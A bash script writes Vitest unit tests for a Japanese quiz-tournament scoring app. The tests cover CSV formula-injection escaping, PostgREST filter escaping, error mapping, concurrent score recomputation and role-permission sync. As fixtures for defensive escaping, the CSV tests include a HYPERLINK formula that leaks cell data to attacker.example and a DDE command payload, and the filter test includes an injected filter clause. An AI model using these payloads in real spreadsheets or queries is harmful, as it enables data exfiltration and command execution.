#!/usr/bin/env bash
set -euo pipefail
[ -f package.json ] && [ -d src ] || { echo "エラー: リポジトリのルートで実行してください" >&2; exit 1; }

echo "write: tests/unit/csv.test.ts"
mkdir -p "$(dirname 'tests/unit/csv.test.ts')"
cat > 'tests/unit/csv.test.ts' <<'QSCORE_EOF'
import { describe, expect, it } from "vitest";
import { buildCsv, csvEscape } from "@/lib/csv";

describe("csvEscape (R-01: CSV/数式インジェクション対策)", () => {
  it("先頭が = の文字列に ' を付ける(受け入れ条件)", () => {
    expect(csvEscape("=1+1")).toBe("'=1+1");
  });

  it.each([
    ["+1+1", "'+1+1"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1:A9)", "'@SUM(A1:A9)"],
    ["\tcmd", "'\tcmd"],
  ])("%j を無害化する", (input, expected) => {
    expect(csvEscape(input)).toBe(expected);
  });

  it("先頭が改行・復帰の文字列も無害化し、さらにクォートで囲む", () => {
    expect(csvEscape("\r=1+1")).toBe('"\'\r=1+1"');
    expect(csvEscape("\n=1+1")).toBe('"\'\n=1+1"');
  });

  it("HYPERLINK 攻撃文字列: 無害化したうえでCSVとして正しくクォートされる", () => {
    const attack = '=HYPERLINK("http://attacker.example/leak?x="&A1,"click")';
    expect(csvEscape(attack)).toBe(
      '"\'=HYPERLINK(""http://attacker.example/leak?x=""&A1,""click"")"'
    );
  });

  it("数式の引き金でない文字列は変更しない", () => {
    expect(csvEscape("山田太郎")).toBe("山田太郎");
    expect(csvEscape("a=b")).toBe("a=b");
    expect(csvEscape("2026-10-15T10:00:00Z")).toBe("2026-10-15T10:00:00Z");
  });

  it("数値(number)は負数でも変更しない", () => {
    expect(csvEscape(-5)).toBe("-5");
    expect(csvEscape(0)).toBe("0");
  });

  it("null / undefined は空文字", () => {
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });

  it("カンマ・ダブルクォート・改行を含む値をクォートする", () => {
    expect(csvEscape("a,b")).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape("line1\nline2")).toBe('"line1\nline2"');
    expect(csvEscape("line1\r\nline2")).toBe('"line1\r\nline2"');
  });
});

describe("buildCsv", () => {
  it("UTF-8 BOM 付き・CRLF区切りで出力する", () => {
    const csv = buildCsv([
      ["表示名", "所属"],
      ["山田", "=cmd|' /C calc'!A0"],
    ]);
    expect(csv.startsWith("\uFEFF")).toBe(true);
    expect(csv.split("\r\n")).toEqual(["\uFEFF表示名,所属", "山田,'=cmd|' /C calc'!A0"]);
  });
});
QSCORE_EOF

echo "write: tests/unit/supabase-filters.test.ts"
mkdir -p "$(dirname 'tests/unit/supabase-filters.test.ts')"
cat > 'tests/unit/supabase-filters.test.ts' <<'QSCORE_EOF'
import { describe, expect, it } from "vitest";
import {
  buildEntrySearchFilter,
  escapeLikePattern,
  quotePostgrestValue,
} from "@/lib/supabase/filters";

describe("PostgREST フィルタの安全な組み立て (R-10)", () => {
  it("LIKE のワイルドカードとバックスラッシュをエスケープする", () => {
    expect(escapeLikePattern("50%_off\\")).toBe("50\\%\\_off\\\\");
  });

  it("値をダブルクォートで囲み、中の \" と \\ をエスケープする", () => {
    expect(quotePostgrestValue('a"b\\c')).toBe('"a\\"b\\\\c"');
  });

  it("通常の検索語", () => {
    expect(buildEntrySearchFilter("山田")).toBe(
      'display_name.ilike."%山田%",email.ilike."%山田%",affiliation.ilike."%山田%"'
    );
  });

  it("カンマ・括弧を含む検索語でも、フィルタ構文の区切りにならない(3条件のまま)", () => {
    const filter = buildEntrySearchFilter("東京大学,クイズ研究会(第2)");
    // 引用符の外側にあるカンマ(=条件の区切り)はちょうど2つ
    const outsideQuotes = filter.replace(/"(?:[^"\\]|\\.)*"/g, '""');
    expect(outsideQuotes.split(",")).toHaveLength(3);
    expect(filter).toContain('"%東京大学,クイズ研究会(第2)%"');
  });

  it("ダブルクォートを含む検索語でも引用が閉じない", () => {
    const filter = buildEntrySearchFilter('a" ,email.eq.x');
    const outsideQuotes = filter.replace(/"(?:[^"\\]|\\.)*"/g, '""');
    expect(outsideQuotes).toBe('display_name.ilike."",email.ilike."",affiliation.ilike.""');
  });
});
QSCORE_EOF

echo "write: tests/unit/rpc-errors.test.ts"
mkdir -p "$(dirname 'tests/unit/rpc-errors.test.ts')"
cat > 'tests/unit/rpc-errors.test.ts' <<'QSCORE_EOF'
import { describe, expect, it } from "vitest";
import { mapRpcError } from "@/lib/supabase/rpc-errors";

describe("mapRpcError", () => {
  it("42501 (権限なし) -> 403", () => {
    const r = mapRpcError({ code: "42501", message: "forbidden" });
    expect(r.status).toBe(403);
    expect(r.body.error).toBe("forbidden");
  });

  it("P0002 (対象なし) -> 404", () => {
    expect(mapRpcError({ code: "P0002", message: "round not found" }).status).toBe(404);
  });

  it("22023 (不正な引数) -> 400", () => {
    expect(mapRpcError({ code: "22023", message: "x" }).status).toBe(400);
  });

  it("想定外のコードは 500 でメッセージを保持する", () => {
    const r = mapRpcError({ code: "XX000", message: "boom" });
    expect(r.status).toBe(500);
    expect(r.body.message).toBe("boom");
  });

  it("code が無い場合も 500", () => {
    expect(mapRpcError({ message: "network" }).status).toBe(500);
  });
});
QSCORE_EOF

echo "write: tests/unit/api-request.test.ts"
mkdir -p "$(dirname 'tests/unit/api-request.test.ts')"
cat > 'tests/unit/api-request.test.ts' <<'QSCORE_EOF'
import { afterEach, describe, expect, it, vi } from "vitest";
import { requestJson } from "@/lib/api/request";

function stubFetch(impl: () => Promise<Response>) {
  vi.stubGlobal("fetch", vi.fn(impl));
}

afterEach(() => vi.unstubAllGlobals());

describe("requestJson (失敗を握りつぶさない)", () => {
  it("2xx は data を返す", async () => {
    stubFetch(async () => Response.json({ currentQuestionNumber: 4 }));
    const r = await requestJson<{ currentQuestionNumber: number }>("/x");
    expect(r).toEqual({ ok: true, status: 200, data: { currentQuestionNumber: 4 } });
  });

  it("サーバーの message を失敗理由として返す", async () => {
    stubFetch(async () =>
      Response.json({ error: "forbidden", message: "この操作を行う権限がありません" }, { status: 403 })
    );
    const r = await requestJson("/x");
    expect(r).toEqual({ ok: false, status: 403, message: "この操作を行う権限がありません" });
  });

  it("message が無ければ error コードを使う", async () => {
    stubFetch(async () => Response.json({ error: "no_events" }, { status: 409 }));
    const r = await requestJson("/x");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.message).toBe("no_events");
  });

  it("本文がJSONでない 500 でもエラーとして返す", async () => {
    stubFetch(async () => new Response("<html>oops</html>", { status: 500 }));
    const r = await requestJson("/x");
    expect(r).toEqual({ ok: false, status: 500, message: "サーバーエラー (HTTP 500)" });
  });

  it("ネットワーク断は例外にせず ok:false", async () => {
    stubFetch(async () => {
      throw new TypeError("fetch failed");
    });
    const r = await requestJson("/x");
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.status).toBe(0);
      expect(r.message).toContain("通信に失敗");
    }
  });
});
QSCORE_EOF

echo "write: tests/unit/recompute-round.test.ts"
mkdir -p "$(dirname 'tests/unit/recompute-round.test.ts')"
cat > 'tests/unit/recompute-round.test.ts' <<'QSCORE_EOF'
import { describe, expect, it } from "vitest";
import type { SupabaseClient } from "@supabase/supabase-js";
import type { Database } from "@/types/database";
import {
  buildRoundParticipantRows,
  recomputeRoundParticipants,
} from "@/lib/rules/apply-round-events";
import { DEFAULT_RULE_CONFIG } from "@/lib/rules/types";

const P1 = "00000000-0000-0000-0000-000000000001";
const P2 = "00000000-0000-0000-0000-000000000002";

type Ev = { id: string; participant_id: string; event_type: string; value: number | null };

/**
 * DB を模した偽クライアント。再計算ロジックが使う呼び出し
 * (rpc / from().select().eq().is().order() / maybeSingle) だけを実装する。
 * 実DBでの並行実行は別途 Postgres で検証済み(0010 マイグレーション)。ここでは
 * 「stale を検知したら最新の状態から計算し直す」というTS側の制御フローを検証する。
 */
function makeFake(init: { seq: number; events: Ev[]; attached?: string[]; onEventsRead?: () => void }) {
  const state = { seq: init.seq, events: [...init.events] };
  const calls: string[] = [];
  const applied: { expectedSeq: number; rows: { participant_id: string; score: number }[] }[] = [];
  const failures: { getSeq?: string; apply?: string } = {};

  const result = (data: unknown) => ({ data, error: null });
  const chain = (produce: () => unknown) => {
    const b: Record<string, unknown> = {};
    for (const m of ["select", "eq", "is", "order"]) b[m] = () => b;
    b.maybeSingle = async () => produce();
    b.then = (res: (v: unknown) => unknown, rej: (e: unknown) => unknown) =>
      Promise.resolve(produce()).then(res, rej);
    return b;
  };

  const client = {
    rpc: async (name: string, args: Record<string, unknown>) => {
      calls.push(`rpc:${name}`);
      if (name === "get_round_score_seq") {
        if (failures.getSeq) return { data: null, error: { message: failures.getSeq } };
        return result(state.seq);
      }
      if (name === "apply_round_computation") {
        if (failures.apply) return { data: null, error: { message: failures.apply } };
        const expectedSeq = args.p_expected_seq as number;
        if (expectedSeq !== state.seq) return result(false); // stale: DB refuses
        applied.push({ expectedSeq, rows: args.p_rows as never });
        return result(true);
      }
      throw new Error(`unexpected rpc ${name}`);
    },
    from: (table: string) => {
      if (table === "rounds") {
        return chain(() => {
          calls.push("read:rounds");
          return result({ rule_config: DEFAULT_RULE_CONFIG, advance_count: null });
        });
      }
      if (table === "score_events") {
        return chain(() => {
          calls.push("read:events");
          const snapshot = [...state.events];
          init.onEventsRead?.call(null);
          return result(snapshot);
        });
      }
      if (table === "round_participants") {
        return chain(() => {
          calls.push("read:attached");
          return result((init.attached ?? []).map((participant_id) => ({ participant_id })));
        });
      }
      throw new Error(`unexpected table ${table}`);
    },
  };

  return {
    client: client as unknown as SupabaseClient<Database>,
    state,
    calls,
    applied,
    failures,
  };
}

describe("recomputeRoundParticipants: 同時操作で古い計算結果を書き込まない (R-04)", () => {
  it("競合なし: 1回の計算で書き込まれる", async () => {
    const fake = makeFake({
      seq: 1,
      events: [{ id: "e1", participant_id: P1, event_type: "CORRECT", value: null }],
      attached: [P1, P2],
    });
    const result = await recomputeRoundParticipants(fake.client, "r1", { retryDelayMs: 0 });
    expect(result.error).toBeNull();
    expect(fake.applied).toHaveLength(1);
    expect(fake.applied[0].expectedSeq).toBe(1);
    const byId = new Map(fake.applied[0].rows.map((r) => [r.participant_id, r.score]));
    expect(byId.get(P1)).toBe(10);
    expect(byId.get(P2)).toBe(0); // イベントのない参加者にも行がある
  });

  it("seq はイベントより『先に』読む(逆順だと古い結果が通ってしまうため)", async () => {
    const fake = makeFake({ seq: 1, events: [], attached: [P1] });
    await recomputeRoundParticipants(fake.client, "r1", { retryDelayMs: 0 });
    expect(fake.calls.indexOf("rpc:get_round_score_seq")).toBeLessThan(
      fake.calls.indexOf("read:events")
    );
    expect(fake.calls.indexOf("read:events")).toBeLessThan(
      fake.calls.indexOf("rpc:apply_round_computation")
    );
  });

  it("計算中に別オペレーターのイベントが入った場合: 拒否されて再計算し、両方のイベントが反映される", async () => {
    let injected = false;
    const fake = makeFake({
      seq: 1,
      events: [{ id: "e1", participant_id: P1, event_type: "CORRECT", value: null }],
      attached: [P1, P2],
      onEventsRead: () => {
        // 1回目のイベント読み取り直後に、別のオペレーターが P2 の正解を記録する
        if (injected) return;
        injected = true;
        fake.state.events.push({ id: "e2", participant_id: P2, event_type: "CORRECT", value: null });
        fake.state.seq += 1;
      },
    });

    const result = await recomputeRoundParticipants(fake.client, "r1", { retryDelayMs: 0 });

    expect(result.error).toBeNull();
    // 1回目(expected 1)は拒否され、2回目(expected 2)だけが書き込まれた
    expect(fake.calls.filter((c) => c === "rpc:apply_round_computation")).toHaveLength(2);
    expect(fake.applied).toHaveLength(1);
    expect(fake.applied[0].expectedSeq).toBe(2);
    const byId = new Map(fake.applied[0].rows.map((r) => [r.participant_id, r.score]));
    expect(byId.get(P1)).toBe(10);
    expect(byId.get(P2)).toBe(10); // 古い計算では漏れていた P2 の得点
  });

  it("書き込みが拒否され続けても無限ループせず、試行回数で止まる(成功扱い)", async () => {
    const fake = makeFake({
      seq: 1,
      events: [{ id: "e1", participant_id: P1, event_type: "CORRECT", value: null }],
      attached: [P1],
      onEventsRead: () => {
        fake.state.seq += 1; // 読むたびに別のイベントが書かれ続ける状況
      },
    });
    const result = await recomputeRoundParticipants(fake.client, "r1", {
      maxAttempts: 3,
      retryDelayMs: 0,
    });
    expect(result.error).toBeNull();
    expect(fake.calls.filter((c) => c === "rpc:apply_round_computation")).toHaveLength(3);
    expect(fake.applied).toHaveLength(0);
  });

  it("get_round_score_seq のエラーを返す", async () => {
    const fake = makeFake({ seq: 1, events: [] });
    fake.failures.getSeq = "forbidden";
    const result = await recomputeRoundParticipants(fake.client, "r1", { retryDelayMs: 0 });
    expect(result.error).toBe("forbidden");
  });

  it("apply_round_computation のエラーを握りつぶさない", async () => {
    const fake = makeFake({
      seq: 1,
      events: [{ id: "e1", participant_id: P1, event_type: "CORRECT", value: null }],
      attached: [P1],
    });
    fake.failures.apply = "permission denied";
    const result = await recomputeRoundParticipants(fake.client, "r1", { retryDelayMs: 0 });
    expect(result.error).toBe("permission denied");
  });

  it("イベントも所属参加者もなければ書き込まない", async () => {
    const fake = makeFake({ seq: 0, events: [], attached: [] });
    const result = await recomputeRoundParticipants(fake.client, "r1", { retryDelayMs: 0 });
    expect(result.error).toBeNull();
    expect(fake.calls).not.toContain("rpc:apply_round_computation");
  });
});

describe("buildRoundParticipantRows (純粋関数)", () => {
  it("イベントのない参加者も score 0 の行になる", () => {
    const rows = buildRoundParticipantRows({
      ruleConfig: DEFAULT_RULE_CONFIG,
      advanceCount: null,
      events: [{ id: "e1", participantId: P1, type: "CORRECT" }],
      attachedParticipantIds: [P1, P2],
    });
    expect(rows.find((r) => r.participant_id === P2)).toMatchObject({
      score: 0,
      correct_count: 0,
      disqualified: false,
    });
  });

  it("通過人数のカットライン: 上位だけ passed=true、失格者は常に false", () => {
    const rows = buildRoundParticipantRows({
      ruleConfig: DEFAULT_RULE_CONFIG,
      advanceCount: 1,
      events: [
        { id: "e1", participantId: P1, type: "CORRECT" },
        { id: "e2", participantId: P2, type: "DISQUALIFY" },
      ],
      attachedParticipantIds: [P1, P2],
    });
    expect(rows.find((r) => r.participant_id === P1)?.passed).toBe(true);
    expect(rows.find((r) => r.participant_id === P2)?.passed).toBe(false);
  });

  it("advanceCount が無ければ passed は null", () => {
    const rows = buildRoundParticipantRows({
      ruleConfig: DEFAULT_RULE_CONFIG,
      advanceCount: null,
      events: [{ id: "e1", participantId: P1, type: "CORRECT" }],
      attachedParticipantIds: [P1],
    });
    expect(rows[0].passed).toBeNull();
  });
});
QSCORE_EOF

echo "write: tests/unit/rls-permissions.test.ts"
mkdir -p "$(dirname 'tests/unit/rls-permissions.test.ts')"
cat > 'tests/unit/rls-permissions.test.ts' <<'QSCORE_EOF'
import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { actionsFor, type TournamentAction } from "@/lib/permissions";
import type { TournamentMemberRole } from "@/types/database";

/**
 * R-03: アプリ層の権限 (ROLE_ACTIONS / can()) と DB 層の権限 (RLS・RPC が使う
 * ロール判定関数) が食い違わないことを、マイグレーションSQLを読んで検証する。
 *
 * DB側のロール配列を変えたのに ROLE_ACTIONS を直し忘れた(またはその逆)場合、
 * このテストが落ちる。実際のRLSの挙動そのもの(各ロールのJWTでの拒否)は
 * Postgres 上で別途検証する必要がある — これは「定義の同期」の安全網。
 */
const ALL_ROLES: TournamentMemberRole[] = [
  "OWNER",
  "ADMIN",
  "QUESTION_MANAGER",
  "SCORE_OPERATOR",
  "GRADER",
  "STREAM_OPERATOR",
  "VENUE_STAFF",
  "VIEWER",
];

const MIGRATION = "0010_role_scoped_rls_and_score_rpc.sql";
const sql = readFileSync(path.join(process.cwd(), "supabase", "migrations", MIGRATION), "utf8");

function rolesInHelper(fn: string): string[] {
  const body = sql.match(new RegExp(`create function public\\.${fn}\\([^)]*\\)[\\s\\S]*?\\$\\$;`));
  if (!body) throw new Error(`${fn} が ${MIGRATION} に見つかりません`);
  const array = body[0].match(/array\[([^\]]*)\]/);
  if (!array) throw new Error(`${fn} にロール配列がありません`);
  return [...array[1].matchAll(/'([A-Z_]+)'/g)].map((m) => m[1]).sort();
}

function rolesAllowing(...actions: TournamentAction[]): string[] {
  return ALL_ROLES.filter((role) => {
    const allowed = actionsFor(role);
    return actions.some((a) => allowed.includes(a));
  }).sort();
}

describe("ROLE_ACTIONS と DB のロール判定関数の同期 (R-03)", () => {
  it("can_operate_score = tournament:operate_score を持つロール", () => {
    expect(rolesInHelper("can_operate_score")).toEqual(rolesAllowing("tournament:operate_score"));
  });

  it("can_write_round_participants = operate_score / grade_paper_quiz / manage_rounds のいずれかを持つロール", () => {
    expect(rolesInHelper("can_write_round_participants")).toEqual(
      rolesAllowing(
        "tournament:operate_score",
        "tournament:grade_paper_quiz",
        "tournament:manage_rounds"
      )
    );
  });

  it("閲覧専用ロール (VIEWER / VENUE_STAFF) はどちらの書き込み判定にも含まれない", () => {
    for (const fn of ["can_operate_score", "can_write_round_participants"]) {
      const roles = rolesInHelper(fn);
      expect(roles).not.toContain("VIEWER");
      expect(roles).not.toContain("VENUE_STAFF");
    }
  });
});

describe("0010 が『大会スタッフなら誰でも書ける』旧ポリシーを置き換えている", () => {
  it.each([
    "round_participants_insert_staff",
    "round_participants_update_staff",
    "score_events_insert_staff",
    "score_events_update_staff",
  ])("旧ポリシー %s を drop している", (name) => {
    expect(sql).toContain(`drop policy "${name}"`);
  });

  it("新しい書き込みポリシーはロール判定関数を使い、is_tournament_member だけで許可していない", () => {
    const policies = [
      ...sql.matchAll(/create policy "([a-z_]+)"\s+on public\.(round_participants|score_events) for (insert|update)[\s\S]*?;\n/g),
    ];
    expect(policies.length).toBeGreaterThanOrEqual(4);
    for (const [text, name] of policies) {
      expect(text, name).toMatch(/can_operate_score|can_write_round_participants/);
      expect(text, name).not.toMatch(/is_tournament_member/);
    }
  });

  it("score_events に DELETE ポリシーを作っていない(追記専用)", () => {
    expect(sql).not.toMatch(/create policy "[a-z_]+"\s+on public\.score_events for delete/);
  });
});
QSCORE_EOF

echo
echo "== 型チェック / Lint / 単体テスト =="
bash test.sh
echo
echo "適用完了。DBへの反映が必要です: npx supabase db push (リモート) / npx supabase db reset (ローカル)"
